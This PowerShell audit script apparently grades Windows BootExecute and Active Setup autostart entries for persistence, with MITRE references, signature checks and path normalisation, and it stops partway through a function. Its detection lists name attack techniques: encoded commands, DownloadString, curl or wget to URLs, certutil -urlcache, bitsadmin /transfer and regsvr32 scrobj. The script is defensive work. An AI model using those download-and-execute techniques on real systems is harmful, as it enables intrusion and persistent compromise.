# boot_activesetup_check.ps1 -- grade the two Section 5 autostart points the
# bats only ever DUMPED: Session Manager's BootExecute (and its sibling
# values) and Active Setup's StubPath commands. Invoked from Section 5 of
# doze_sec.bat / doze_sec_noAdmin.bat.
#
# WHY (2026-11-26, I4b): Section 5 printed
#   --- BootExecute (SAFE: autocheck autochk * only) ---
# above a raw `reg query`, and a raw `reg query ... | findstr StubPath` below
# it. Nothing compared either with anything, so neither could ever raise a
# row: Section 5 read CLEAN whatever they held. THREAT_MODEL claimed Active
# Setup coverage that did not exist.
#
# THE SHAPE OF THE RULES: DEFAULT-DENY. This is the third version. The first
# read "[OK] ... (signed by Microsoft Windows)" for 11 of 17 hostile lines.
# The second judged what a program is handed, but still fell through to [OK]
# for whatever it did not recognise, and an independent review of its final
# tree found eleven more ways in (a staging folder spelled C:\Users\.\Public,
# ssh.exe under Program Files, a renamed cmd.exe, `updater /s` read as
# Windows' own argument-only entry, autofmt told to format a volume at boot).
# So [OK] is now reachable only when the check can account for the WHOLE
# line; everything it cannot account for is named.
#
# BOOTEXECUTE (T1547.001). MITRE lists the BootExecute value of
# HKLM\SYSTEM\CurrentControlSet\Control\Session Manager under Registry Run
# Keys / Startup Folder: "the default value ... is set to autocheck autochk *"
# and adversaries add programs to it (attack.mitre.org/techniques/T1547/001).
# Session Manager runs every entry as a NATIVE program, as SYSTEM, before
# Windows has started -- before any security product. Sysinternals, "Inside
# Native Applications" (learn.microsoft.com/sysinternals/resources/
# inside-native-applications): the value "contains the names and arguments of
# programs that are executed by Session Manager ... Autocheck Autochk *", and
# Session Manager "looks in the <winnt>\system32 directory for the
# executables listed". chkntfs (learn.microsoft.com/windows-server/
# administration/windows-commands/chkntfs) rewrites the autochk entry's
# arguments -- /x excludes volumes (autochk /k:C *), /c schedules one -- so
# switches and \??\<volume> arguments on autochk are Windows' own. The
# siblings BootExecuteNoPnpSync, SetupExecute and PlatformExecute are run by
# the same Session Manager and are empty or absent on a normal machine.
#   OK       autochk with only switches, `*` and \??\<volume> arguments,
#            separated by spaces or tabs. Nothing else.
#   WARNING  any other entry whose image is validly signed. That includes
#            Microsoft's own natives: a native tool does what it is told
#            (autofmt formats a volume), and Windows servicing can leave
#            poqexec in SetupExecute while an update waits for a restart --
#            the line says to restart and run the audit again. An antivirus
#            boot-time scanner is named with its signer. Also: an image that
#            is not on disk, could not be read, or is not a plain file on a
#            local fixed drive (never opened); a value that is not text.
#   CRITICAL an image in a staging path, or one that is not validly signed:
#            an unsigned program running before Windows starts, as SYSTEM.
#
# ACTIVE SETUP (T1547.014). MITRE: "Adversaries may achieve persistence by
# adding a Registry key to the Active Setup of the local machine ... under
# HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\ ... a malicious
# StubPath", run at each user's next sign-in with that user's rights
# (attack.mitre.org/techniques/T1547/014). Windows, Edge and Chrome all keep
# StubPaths here, so presence is never the finding.
#   The program is found the way CreateProcess finds it (Microsoft documents
#   the order for a command line without a module name): each whitespace-
#   separated prefix in turn, .exe added when the name has no extension, and
#   the first try that EXISTS is the program, whatever its extension. Every
#   prefix is tried, a forward slash is a separator, and paths are judged
#   after Windows' own normalisation ('.', '..', doubled slashes, a trailing
#   period: Microsoft, "File path formats on Windows systems") and, where the
#   file exists, under its long name.
#   CRITICAL attack-shaped content (the list persistence_eval uses, plus the
#            Windows launchers url.dll FileProtocolHandler/OpenURL, shell32
#            ShellExec_RunDLL and msiexec from a URL), or a staging folder in
#            the line, in the program's real path, or in a file it is handed.
#   [OK]     ONLY a line Windows, Edge or Chrome is known to keep (the table
#            under this comment): a known program at its own location -- in
#            System32 or SysWOW64 under the name Microsoft built it with, or
#            Edge's Installer\setup.exe, Chrome's Installer\chrmstp.exe,
#            Windows Mail's WinMail.exe -- validly signed, with the arguments
#            it is known to carry, and for rundll32 and regsvr32 the known
#            DLL, validly signed, in System32 or SysWOW64.
#            `cmd.exe /D /C start <full path>.exe ...` naming a file that
#            exists is graded as that program.
#            MEASURED on the CI runner (Windows Server, 2026-11-28): unregmp2
#            /FirstLogon, ie4uinit -UserConfig, Rundll32 mscories.dll,Install
#            (System32 and SysWOW64), iesetup.dll,IEHardenAdmin/IEHardenUser,
#            Edge setup.exe and Chrome chrmstp.exe --configure-user-settings.
#            RECALLED from Windows 10 and 11 desktops, not yet measured:
#            WinMail.exe OCInstallUserConfigOE, regsvr32 themeui.dll and
#            shell32.dll, `cmd.exe /D /C start ie4uinit.exe -ClearIconCache`,
#            and `iedkcs32.dll,BrandIEActiveSetup SIGNUP` -- the one line
#            allowed text after its entry point, by its exact text.
#   INFO     listed, not cleared and not raised:
#            a validly signed line that is not in the table -- a known setup
#            program with other plain switches; rundll32 or regsvr32 with
#            another validly signed DLL and nothing after the entry point;
#            msiexec with a validly signed package, or with a product code
#            (the package is not traced); another vendor's validly signed
#            program that is handed nothing this check can recognise as code,
#            an address or a host -- each only from an administrator-only
#            folder;
#            an entry switched off (a DWORD IsInstalled of 0); a missing
#            program when every place Windows would try is absent and under
#            an administrator-only folder (a stale entry); Windows' own two
#            argument-only entries, by their EXACT text -- Themes Setup
#            '/UserInstall' and Windows Desktop Update 'U', measured on the
#            runner -- when nothing by that name is where Windows would look.
#   WARNING  everything else, named: a program that is not validly signed; a
#            script host, an interpreter or a script file; a Microsoft
#            program that is not in the table, or is one of them in another
#            folder or under another name; a known setup program with an
#            argument this check cannot account for (anything after a
#            rundll32 entry point, a URL, a path); another vendor's program
#            handed unsigned code, a network path, an address or a host; a
#            validly signed program or file in a folder a standard user may
#            be able to write to (it can be replaced, or made to load a file
#            placed beside it); a program that is missing where a file placed
#            later would run, or named without its folder and found nowhere,
#            or by a relative path, or inside each user's own profile; a path
#            that is not a plain file on a local fixed drive; a StubPath that
#            is not text, or is longer than any real one.
#   NEVER OPENED: a path that is not a plain file on a local fixed drive -- a
#   network path, a mapped or removable drive, a device name, a stream, a
#   path that runs through a link or a cloud placeholder. Opening one would
#   make the audit connect to a server the entry's author chose and offer it
#   the auditor's credentials, and would break -readonly's "no network
#   connections". Get-FileFacts is the one door to the disk for a path from
#   the registry; the search-path lookup goes through it too, and -SelfTest
#   reads this file's own syntax tree to prove nothing else touches a file.
#   NOT COVERED, and said in the lines that depend on it: another account's
#   own PATH folders (a bare name is looked up on THIS account's search
#   path), the folder Windows starts the command in, folder permissions (the
#   administrator-only test is by name; the ACL is not read), what a signed
#   DLL's entry point or a signed program does with plain switches, what
#   another vendor's program does with its own data files, the package an
#   msiexec product code names, and whether Edge's, Chrome's or Windows
#   Mail's file is the program its name says (the name Microsoft built a file
#   with is compared only in System32 and SysWOW64).
#   The native Installed Components key is read through the 64-bit registry
#   view, and System32 through Sysnative, so a 32-bit PowerShell reads the
#   real ones.
#
# GAPS. Absence is decided only by ItemNotFoundException (the key) or by the
# value list (the value). A key or value that could not be read is
# `[WARNING] ... NOT performed`, with its own marker, never an all-clear.
# Session Manager and the native Installed Components key exist on every
# Windows, so their absence is a gap too; the Wow6432Node twin is optional.
#
# MARKERS (in -MarkerDir): dz_bootexec.txt / dz_activesetup.txt hold the
# finding severity; dz_bootexec_gap.txt / dz_activesetup_gap.txt the gap;
# dz_bootas_done.txt is written last (the bats raise "produced no verdict"
# without it).
#
# Windows PowerShell 5.1 compatible. Read-only: registry and file reads,
# Authenticode checks, marker writes. -SelfTest runs the pure graders only,
# against a pretend disk whose answer for any file it was not given is
# "absent" -- a test double that says "signed" by default tests nothing.

[CmdletBinding()]
param(
    [string]$MarkerDir = $env:TEMP,
    # CI-only: a planted Session Manager key and Installed Components roots
    # (throwaway HKCU keys). Prefixed Ci so no name collides,
    # case-insensitively, with a variable of the script.
    [string]$CiSessionKey = '',
    [string[]]$CiActiveSetupRoots = @(),
    [switch]$SelfTest
)

$ErrorActionPreference = 'Continue'

# Strong command-content indicators, kept in sync with persistence_eval.ps1
# and startup_eval.ps1.
$script:StrongContent = @(
    '-enc(odedcommand)?\b',
    '-e\s+[A-Za-z0-9+/=]{24,}',
    'frombase64string',
    'downloadstring', 'downloadfile',
    '(invoke-webrequest|\biwr\b|\bcurl\b|\bwget\b)[^\r\n]*https?:',
    '(iex|invoke-expression)\s*[\(\$]', '\|\s*(iex|invoke-expression)\b',
    'mshta\s+https?:', 'mshta\s+javascript', 'mshtml,runhtmlapplication',
    'certutil[^\r\n]*-urlcache', 'certutil[^\r\n]*-decode', 'bitsadmin[^\r\n]*/transfer',
    'regsvr32[^\r\n]*/i:http', 'regsvr32[^\r\n]*scrobj', 'rundll32[^\r\n]*javascript'
)
# A signed Windows DLL host told to launch something else: these exports run
# whatever they are handed, and msiexec installs from a URL.
$script:LauncherContent = @('fileprotocolhandler', 'shellexec_rundll', '\bopenurl\b', 'msiexec[^\r\n]*https?:')
# Staging paths, anchored (\Users\Public\, never a bare \Public\: CLAUDE.md).
$script:StagingRx = '\\Temp\\|\\Downloads\\|\\Users\\Public\\|\\\$Recycle|\\ProgramData\\update'
$script:ScriptHostNames = @('powershell.exe', 'pwsh.exe', 'cmd.exe', 'wscript.exe', 'cscript.exe', 'mshta.exe')
# Another vendor's interpreters: what they run is in a file this check does
# not read. A list, so incomplete by nature; an unknown one is still judged
# on what it is handed.
$script:InterpreterRx = '^(?i)(python(w)?[\d.]*|py(w)?|node|java(w)?|perl|ruby(w)?|php(-cgi|-win)?|autohotkey\w*|lua[\d.]*|tclsh[\d.]*|wish[\d.]*|deno|bun|bash|sh)\.exe$'
$script:ScriptExt = @('.vbs', '.vbe', '.js', '.jse', '.wsf', '.wsh', '.hta', '.ps1', '.bat', '.cmd')
# The name of a host inside another program's arguments (--launcher="cmd /c
# ..."): the work is handed on. Not a switch that merely is called /cmd.
$script:HostNameRx = '(?i)(?<![\w.\\/-])(powershell|pwsh|cmd|wscript|cscript|mshta|rundll32|regsvr32|msiexec)(\.exe)?(?![\w.-])'
$script:HostLeaves = @('powershell.exe', 'pwsh.exe', 'cmd.exe', 'wscript.exe', 'cscript.exe', 'mshta.exe', 'rundll32.exe', 'regsvr32.exe', 'msiexec.exe')
# File types that are code to whatever is handed them.
$script:CodeExtRx = '(?i)\.(exe|dll|ocx|cpl|scr|com|pif|bat|cmd|ps1|psm1|psd1|vbs|vbe|js|jse|wsf|wsh|wsc|hta|msi|msp|mst|jar|class|py|pyw|rb|pl|php|ahk|lua|tcl|sh|lnk|inf|sct|xsl|reg|msc|application|gadget)$'
# An address in an argument: scheme://, or a script scheme.
$script:UrlRx = '(?i)\b[a-z][a-z0-9+.-]{1,15}://[^ \t]*|\b(?:javascript|vbscript):'
# A network endpoint in an argument: an IPv4 address, user@host, host:port
# (a host has a letter in it, so 12:30 is a time). A tunnel or a remote
# shell needs no file, only somewhere to connect.
$script:EndpointRx = '(?<![\w.])(?:\d{1,3}\.){3}\d{1,3}(?![\w.])|[\w.-]+@[\w-]+(?:\.[\w-]+)*|(?<![\w\\/.-])(?=[A-Za-z0-9.-]*[A-Za-z])[A-Za-z0-9][A-Za-z0-9-]*(?:\.[A-Za-z0-9][A-Za-z0-9-]*)*:\d{2,5}(?!\d)'
# Folders under the Windows folder that standard users can write to on a
# default install (the published AppLocker-bypass folder lists). Used only to
# make a verdict MORE cautious: a missing file there is not "stale".
$script:UserWritableWindowsRx = '(?i)\\(Tasks|tracing|Registration\\CRMLog|debug\\WIA|FxsTmp|com\\dmp|spool\\PRINTERS|spool\\SERVERS|spool\\drivers\\color|Tasks_Migrated|Crypto\\RSA\\MachineKeys)\\'
# A device name is not a file: opening CON waits for a keyboard. With or
# without an extension, trailing spaces or periods, and the superscript
# digits Windows also accepts after COM and LPT.
$script:DeviceNameRx = '^(?i)(CON|PRN|AUX|NUL|COM[0-9\u00B9\u00B2\u00B3]|LPT[0-9\u00B9\u00B2\u00B3]|CONIN\$|CONOUT\$|CLOCK\$)[ ]*(\.[^\\]*)?[ .]*$'
# Windows' own argument-only StubPaths, by exact text (measured on the CI
# runner, 2026-11-26): Themes Setup {2C7339CF-2B09-4501-B3F3-F3508C9228ED}
# and Windows Desktop Update {89820200-ECBD-11cf-8B85-00AA005B4340}. Exact,
# because "a bare word that resolves to nothing" is also what an entry
# waiting for its file looks like.
$script:StockArgOnly = @('/UserInstall', 'U')
# THE LINES WINDOWS, EDGE AND CHROME ARE KNOWN TO KEEP HERE. [OK] means one
# of these and nothing else: a known program at its own location, with
# arguments it is known to carry. Any other validly signed line is [INFO]:
# listed, not cleared. MEASURED on the CI runner (Windows Server, 2026-11-28)
# unless marked recalled; a recalled line that is wrong reads as [INFO] or as
# a WARNING, never as [OK] for something else.
$script:KnownArgs = @{
    # -UserConfig measured; the other three recalled (Windows 7 to 11).
    'ie4uinit.exe' = @('-UserConfig', '-ClearIconCache', '-BaseSettings', '-UserIconConfig')
    'unregmp2.exe' = @('/FirstLogon', '/ShowWMP')
    # Edge's Installer\setup.exe; --channel recalled from older versions.
    'setup.exe'    = @('--configure-user-settings', '--verbose-logging', '--system-level', '--msedge', '--channel=stable', '--channel=beta', '--channel=dev')
    'chrmstp.exe'  = @('--configure-user-settings', '--verbose-logging', '--system-level', '--channel=stable', '--channel=beta', '--channel=dev')
    # Recalled.
    'winmail.exe'  = @('OCInstallUserConfigOE')
}
# rundll32: "<dll>,<entry point>" with the DLL in System32 or SysWOW64. The
# last is RECALLED ("Browser Customizations",
# {60B49E34-C7CC-11D0-8953-00A0C90347FF}, Windows 7 to 10) and is the only
# line allowed text after its entry point, by its exact text.
$script:KnownDllCalls = @('iesetup.dll,IEHardenAdmin', 'iesetup.dll,IEHardenUser', 'mscories.dll,Install', 'iedkcs32.dll,BrandIEActiveSetup SIGNUP')
# regsvr32: one DLL in System32 or SysWOW64 and exactly these switches (in
# lower case, sorted by character code). Both RECALLED (older Windows; today's keep '/UserInstall' and
# 'U' alone, which is measured).
$script:KnownRegsvr = @('themeui.dll /i:/userinstall /n /s', 'shell32.dll /i:u /n /s')
# A path written with one of these names a different file for every user;
# this audit sees only its own account's copy.
$script:PerUserVars = @{ USERPROFILE = 'USERPROFILE'; USERNAME = 'USERPROFILE'; APPDATA = 'APPDATA'; LOCALAPPDATA = 'LOCALAPPDATA'; HOMEPATH = 'HOMEPATH' }
$script:BootValues = @('BootExecute', 'BootExecuteNoPnpSync', 'SetupExecute', 'PlatformExecute')
# Get-CreateProcessTries (pinned copy) stops after this many tries.
$script:MaxTries = 24
# Budgets. The longest measured StubPath is under 200 characters; one of
# 31,000 made the second version probe the disk 8,003 times. CreateProcess
# itself refuses a module path of MAX_PATH (260) or more.
$script:MaxStubLength = 2000
$script:MaxBootEntryLength = 512
$script:MaxBootEntries = 64
$script:MaxArgTokens = 48
$script:MaxEntries = 512
$script:MaxPath = 259
# Arguments this check can account for without knowing the program.
$script:RxSwitch = '^(?:-{1,2}|/)[A-Za-z][A-Za-z0-9_-]*(?:[:=]/?[A-Za-z0-9_]+)?$'
$script:RxPlainSwitch = '^(?:-{1,2}|/)[A-Za-z][A-Za-z0-9_-]*$'
$script:RxWord = '^[A-Za-z][A-Za-z0-9_]*$'
$script:RxGuid = '^\{[0-9A-Fa-f]{8}(?:-[0-9A-Fa-f]{4}){3}-[0-9A-Fa-f]{12}\}$'
$script:RxSwitchGuid = '^/[A-Za-z]{1,8}\{[0-9A-Fa-f]{8}(?:-[0-9A-Fa-f]{4}){3}-[0-9A-Fa-f]{12}\}$'
$script:RxMsiProp = '^[A-Z][A-Z0-9_]*=[A-Za-z0-9_-]*$'
$script:RxExport = '^[A-Za-z_@?$][A-Za-z0-9_@?$]*$'

# Pinned shared copies (tools/lint_shared_copies.ps1): byte-identical to
# the other tools' copies.
# Live. Four states, never two: nokey|unreadable|absent|present.
function Read-RegValueState {
    param([string]$KeyPath, [string]$Name)
    $k = $null
    try { $k = Get-Item -LiteralPath $KeyPath -ErrorAction Stop }
    catch {
        if ($_.Exception -is [System.Management.Automation.ItemNotFoundException]) { return @{ State = 'nokey'; Value = $null; Kind = ''; Error = '' } }
        return @{ State = 'unreadable'; Value = $null; Kind = ''; Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message) }
    }
    try {
        if (@($k.GetValueNames()) -notcontains $Name) { return @{ State = 'absent'; Value = $null; Kind = ''; Error = '' } }
        return @{ State = 'present'; Value = $k.GetValue($Name, $null); Kind = [string]$k.GetValueKind($Name); Error = '' }
    } catch { return @{ State = 'unreadable'; Value = $null; Kind = ''; Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message) } }
}

function Test-AbsentForSure {
    # A path is absent only when its parent ANSWERS without it, or the parent
    # itself does not exist (a browser that is not installed). A parent that
    # refuses to list is not an answer.
    param([string]$Path)
    $parent = [IO.Path]::GetDirectoryName($Path); $leaf = [IO.Path]::GetFileName($Path)
    if (-not $parent -or -not $leaf) { return $false }
    try { $names = @([IO.Directory]::GetFileSystemEntries($parent)) }
    catch [System.IO.DirectoryNotFoundException] { return $true }
    catch { return $false }
    foreach ($n in $names) { if ([IO.Path]::GetFileName($n) -eq $leaf) { return $false } }
    return $true
}

# Registry key last-write time, via RegQueryInfoKey (the provider does not
# expose it); every failure degrades to $null.
function Get-RegKeyLastWrite {
    param([string]$KeyPath)
    if (-not $KeyPath) { return $null }
    try {
        if (-not ([System.Management.Automation.PSTypeName]'DozeSec.RegTime').Type) {
            Add-Type -ErrorAction Stop -Namespace DozeSec -Name RegTime -MemberDefinition @'
[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
public static extern int RegQueryInfoKey(IntPtr hKey, System.Text.StringBuilder lpClass,
    IntPtr lpcchClass, IntPtr lpReserved, IntPtr lpcSubKeys, IntPtr lpcbMaxSubKeyLen,
    IntPtr lpcbMaxClassLen, IntPtr lpcValues, IntPtr lpcbMaxValueNameLen,
    IntPtr lpcbMaxValueLen, IntPtr lpcbSecurityDescriptor, out long lpftLastWriteTime);
'@
        }
    } catch { return $null }
    $key = $null
    try {
        # Accept both provider paths (HKLM:\...) and PSPath forms.
        $p = $KeyPath -replace '^Microsoft\.PowerShell\.Core\\Registry::', ''
        $p = $p -replace '^HKEY_LOCAL_MACHINE\\', 'HKLM:\' -replace '^HKEY_CURRENT_USER\\', 'HKCU:\'
        $key = Get-Item -LiteralPath $p -EA Stop
        $ft = [long]0
        $rc = [DozeSec.RegTime]::RegQueryInfoKey($key.Handle.DangerousGetHandle(),
            $null, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero,
            [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero,
            [IntPtr]::Zero, [ref]$ft)
        if ($rc -ne 0 -or $ft -le 0) { return $null }
        return [datetime]::FromFileTime($ft)
    } catch { return $null }
}

# WHEN did this appear? Registry times are per KEY; file times can be forged.
function Get-WhenLine {
    param([string]$KeyPath = '', [string]$FilePath = '')
    $parts = @()
    if ($KeyPath) {
        $lw = Get-RegKeyLastWrite $KeyPath
        if ($null -ne $lw) { $parts += ("registry key last modified {0}" -f $lw.ToString('yyyy-MM-dd HH:mm:ss')) }
    }
    if ($FilePath) {
        try {
            $f = Get-Item -LiteralPath $FilePath -EA Stop
            $parts += ("file written {0}" -f $f.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss'))
            # Creation AFTER last-write is the classic timestomp tell, so show
            # creation whenever the two disagree in either direction.
            if ($f.CreationTime -and $f.CreationTime -ne $f.LastWriteTime) {
                $parts += ("created {0}" -f $f.CreationTime.ToString('yyyy-MM-dd HH:mm:ss'))
            }
        } catch {}
    }
    if ($parts.Count -eq 0) { return $null }
    return ("  when: {0}" -f ($parts -join '  |  '))
}

$script:whenCaveatShown = $false
function Write-WhenCaveat {
    if ($script:whenCaveatShown) { return }
    $script:whenCaveatShown = $true
    '  note: registry times are per KEY (any value change updates them) and file times can be forged (timestomping, T1070.006) -- treat them as leads, not proof.'
}

# PURE. The tries CreateProcess makes for an UNQUOTED command line, in order
# (Microsoft, CreateProcessW with no module name): one per whitespace-
# separated prefix, taken as-is when its last path component has a dot, with
# .exe appended when it has none. Returns @( @{ Try; ArgLike } ).
function Get-CreateProcessTries {
    param([string]$CommandLine)
    $out = New-Object System.Collections.ArrayList
    $s = ([string]$CommandLine).TrimEnd()
    if (-not $s -or $s.StartsWith('"')) { return @() }
    $ends = New-Object System.Collections.ArrayList
    for ($i = 1; $i -lt $s.Length; $i++) {
        if (($s[$i] -eq ' ' -or $s[$i] -eq "`t") -and $s[$i - 1] -ne ' ' -and $s[$i - 1] -ne "`t") { [void]$ends.Add($i) }
    }
    [void]$ends.Add($s.Length)
    foreach ($e in $ends) {
        if ($out.Count -ge $script:MaxTries) { break }
        $pre = $s.Substring(0, $e)
        if ($pre.EndsWith('\')) { continue }
        $last = $pre.Substring($pre.LastIndexOf('\') + 1)
        $tok = @($pre -split '[ \t]+')[-1]
        $try = $(if ($last.Contains('.')) { $pre } else { $pre + '.exe' })
        [void]$out.Add(@{ Try = $try; ArgLike = ($tok -match '^[-/]') })
    }
    return @($out.ToArray())
}

# PURE. Windows path arithmetic as strings: Join-Path asks the provider for
# the drive (it fails for a drive this machine lacks, and on Linux for every
# drive), and IO.Path splits on '/' only on Linux, so the self-test would not
# mean what it means on Windows.
function Join-WinPath { param([string]$A, [string]$B) return ($A.TrimEnd('\') + '\' + $B.TrimStart('\')) }
function Get-WinLeaf { param([string]$P) return (([string]$P) -split '\\')[-1] }

# PURE. Text from the registry or the disk, made safe to print: one line, no
# control characters, no text-direction marks. A key name holding a line
# break could otherwise write a line of its own into the report
# ("[OK] Active Setup: 9 ... none suspicious.").
function Get-CleanText {
    param([string]$Text)
    return ((([string]$Text) -replace '[\x00-\x1F\x7F-\x9F\u2028\u2029\u200E\u200F\u202A-\u202E\u2066-\u2069]+', ' ').Trim())
}

# PURE. A drive-rooted path as Windows itself normalises it (Microsoft, "File
# path formats on Windows systems"): '.' and '..' are resolved, repeated and
# forward slashes are one backslash, a segment loses ONE trailing period, and
# the last segment loses every trailing period and space. So
# "C:\Users\.\Public", "C:\Users\\Public" and "C:\Windows\Tasks." are judged
# as the folders they are. A folder name keeps a trailing SPACE: Windows does.
function Get-NormalWinPath {
    param([string]$P)
    $p0 = [string]$P
    if ($p0 -notmatch '^[A-Za-z]:[\\/]') { return $p0 }
    $segs = @($p0.Substring(3) -split '[\\/]')
    $keep = New-Object System.Collections.Generic.List[string]
    for ($i = 0; $i -lt $segs.Count; $i++) {
        $seg = [string]$segs[$i]
        if ($seg -eq '' -or $seg -eq '.') { continue }
        if ($seg -eq '..') { if ($keep.Count) { $keep.RemoveAt($keep.Count - 1) }; continue }
        if ($seg -notmatch '^\.+$') {
            if ($i -eq $segs.Count - 1) { $seg = $seg.TrimEnd('.', ' ') }
            elseif ($seg.EndsWith('.') -and -not $seg.EndsWith('..')) { $seg = $seg.Substring(0, $seg.Length - 1) }
        }
        if ($seg -eq '') { continue }
        $keep.Add($seg)
    }
    return ($p0.Substring(0, 2) + '\' + ($keep.ToArray() -join '\'))
}

# PURE. A file name with no folder that may be looked up on the search path:
# no separator, no drive, no stream, no wildcard, not a device.
function Test-PlainName {
    param([string]$Name)
    $n = [string]$Name
    if (-not $n -or $n.Length -gt 255) { return $false }
    if ($n -match '[\\/:*?"<>|\x00-\x1F]') { return $false }
    if ($n -match $script:DeviceNameRx) { return $false }
    return $true
}

# PURE. May this path be opened? Only a plain file path on a local FIXED
# drive, short enough for CreateProcess to run. Not a network path, not a
# drive that is mapped, removable or missing, not a device name, not a
# stream, not a name no file can have. $DriveKind: drive letter -> the
# DriveType word.
function Test-OpenablePath {
    param([string]$Path, [scriptblock]$DriveKind)
    $p = [string]$Path
    if ($p.Length -gt $script:MaxPath) { return $false }
    if ($p -notmatch '^[A-Za-z]:\\') { return $false }
    if ($p.Substring(2) -match '[:*?"<>|\x00-\x1F]') { return $false }
    foreach ($seg in ($p.Substring(3) -split '\\')) {
        if ($seg -match $script:DeviceNameRx) { return $false }
    }
    $k = ''
    try { $k = [string](& $DriveKind $p.Substring(0, 1)) } catch { $k = '' }
    return ($k -eq 'Fixed')
}

# PURE. A normalised path that NO file can have, so Windows cannot run it:
# too long for CreateProcess, a character no file name holds, or a colon in
# a folder name. (A colon in the LAST name is a stream, which can exist.)
function Test-ImpossibleName {
    param([string]$Path)
    $p = [string]$Path
    if ($p.Length -gt $script:MaxPath) { return $true }
    if ($p -notmatch '^[A-Za-z]:\\') { return $false }
    $rest = $p.Substring(3)
    if ($rest -match '[*?"<>|\x00-\x1F]') { return $true }
    $segs = @($rest -split '\\')
    for ($i = 0; $i -lt $segs.Count - 1; $i++) { if ($segs[$i].Contains(':')) { return $true } }
    return $false
}

function Get-MaxSev {
    param([string]$A, [string]$B)
    if ($A -eq 'CRITICAL' -or $B -eq 'CRITICAL') { return 'CRITICAL' }
    if ($A -eq 'WARNING'  -or $B -eq 'WARNING')  { return 'WARNING' }
    return 'OK'
}

function Write-Marker {
    param([string]$Name, [string]$Sev)
    if ($Sev -eq 'OK') { return }
    # The marker IS the route to the findings ledger; a failed write prints.
    if (-not (Test-Path -LiteralPath $MarkerDir)) {
        New-Item -ItemType Directory -Path $MarkerDir -Force -EA SilentlyContinue | Out-Null
    }
    Set-Content -LiteralPath (Join-Path $MarkerDir ("dz_{0}.txt" -f $Name)) -Value $Sev -Encoding ASCII
}

function Get-OneLine {
    param([string]$Text)
    return ((([string]$Text) -replace '\s+', ' ').Trim())
}

# The one door to the disk for a path that came from the registry. $Probe: a
# path -> @{ State = signed|unsigned|unverified|absent|unread|dir|reparse; CN;
# Microsoft; Status; Why; RealPath; OriginalName; Pe; Link }. It is called
# ONLY for a path Test-OpenablePath allows; anything else comes back
# 'notlocal' without being touched. 'reparse' is the probe saying the path
# runs through a link or a placeholder, which it did not follow. RealPath is
# the path under its long name when the probe could tell, else the
# normalised path as given.
function Get-FileFacts {
    param([string]$Path, [scriptblock]$Probe, [scriptblock]$DriveKind)
    $p = Get-NormalWinPath $Path
    if (-not (Test-OpenablePath $p $DriveKind)) { return @{ State = 'notlocal'; RealPath = $p } }
    $f = $null
    try { $f = & $Probe $p } catch { $f = @{ State = 'unread'; Why = (Get-OneLine $_.Exception.Message) } }
    $g = @{ State = 'unread'; Why = 'the file probe gave no answer'; RealPath = $p }
    if ($f -is [hashtable]) { foreach ($k in @($f.Keys)) { $g[$k] = $f[$k] } }
    if (-not $g.RealPath) { $g.RealPath = $p }
    $g.RealPath = Get-NormalWinPath ([string]$g.RealPath)
    return $g
}

# The one way a name without a folder is looked up. $Which: a plain file
# name -> its full path on this account's search path, or ''. Never called
# for a name that holds a drive, a separator, a stream or a device name.
function Find-OnSearchPath {
    param([string]$Name, [scriptblock]$Which)
    if (-not (Test-PlainName $Name)) { return '' }
    $w = ''
    try { $w = [string](& $Which $Name) } catch { $w = '' }
    return $w
}

# PURE, by name: the ACL is not read. Under the Windows folder?
function Test-UnderWindows {
    param([string]$P, [string]$SystemRoot)
    return ([string]$P).StartsWith($SystemRoot.TrimEnd('\') + '\', [StringComparison]::OrdinalIgnoreCase)
}

# PURE, by name. A place only an administrator can put a file on a default
# install: the Windows folder (less the folders users can write), Program
# Files on the system drive, and the root of the system drive.
function Test-AdminOnlyPath {
    param([string]$P, [string]$SystemRoot)
    $q = Get-NormalWinPath ([string]$P)
    if (Test-UnderWindows $q $SystemRoot) { return (($q + '\') -notmatch $script:UserWritableWindowsRx) }
    $drive = [regex]::Escape($SystemRoot.Substring(0, 2))
    if ($q -match ('^(?i)' + $drive + '\\Program Files( \(x86\))?\\.')) { return $true }
    return ($q -match ('^(?i)' + $drive + '\\[^\\]+$'))
}

# PURE. A staging folder anywhere in the text. Every drive path in it is
# normalised first, so C:\Users\.\Public\x.exe and C:/Users/Public/x.exe are
# the folder they name. The pattern is a literal folder name, so the only
# thing normalising can add is a spelling that was hiding one.
function Test-StagingText {
    param([string]$Text)
    $t = [string]$Text
    if ($t -match $script:StagingRx) { return $true }
    $n = 0
    foreach ($m in [regex]::Matches($t, '[A-Za-z]:[\\/]')) {
        $n++
        if ($n -gt 16) { break }
        # From each drive path to the next quote, or to the end of the text.
        $end = $t.IndexOf('"', $m.Index)
        if ($end -lt 0) { $end = $t.Length }
        if (((Get-NormalWinPath $t.Substring($m.Index, $end - $m.Index)) + '\') -match $script:StagingRx) { return $true }
    }
    return $false
}

# PURE. The first word of a command line: a quoted path, or up to the space.
function Get-FirstToken {
    param([string]$Line)
    $l = ([string]$Line).Trim(' ', "`t")
    if ($l.StartsWith('"')) { $e = $l.IndexOf('"', 1); if ($e -gt 1) { return $l.Substring(1, $e - 1) } }
    return ($l -split '[ \t]+')[0]
}

# PURE. Is this BootExecute entry Windows' own disk check? autochk with only
# switches (/k:C, /q, /v, /m, /p ...), `*` and \??\<volume> arguments, with or
# without the `autocheck` keyword, separated by spaces or tabs and nothing
# else. Anything else -- another program, or an argument of another shape --
# is raised.
function Test-AutochkEntry {
    param([string]$Entry)
    return ([string]$Entry -match '^(?i)[ \t]*(autocheck[ \t]+)?autochk(\.exe)?([ \t]+(\*|/[a-z]+(:[^ \t]*)?|\\\?\?\\([a-z]:|volume\{[0-9a-f-]+\})\\?))*[ \t]*$')
}

# PURE. The native image a BootExecute entry runs. Session Manager takes the
# first word after its optional keywords (autocheck, async, debug) and looks
# for it in System32, adding .exe; a \??\X: path or a drive path names the
# file itself. Any other native path, and a network path, is returned as it
# is: named, never opened. The path is normalised, so a name that climbs out
# of System32 is not "in" it.
function Get-NativeImagePath {
    param([string]$Entry, [string]$SystemRoot = $env:SystemRoot)
    $e = ([string]$Entry).Trim(' ', "`t") -replace '^(?i)(?:(?:autocheck|async|debug)[ \t]+)+', ''
    $tok = (($e -split '[ \t]+')[0]).Trim('"')
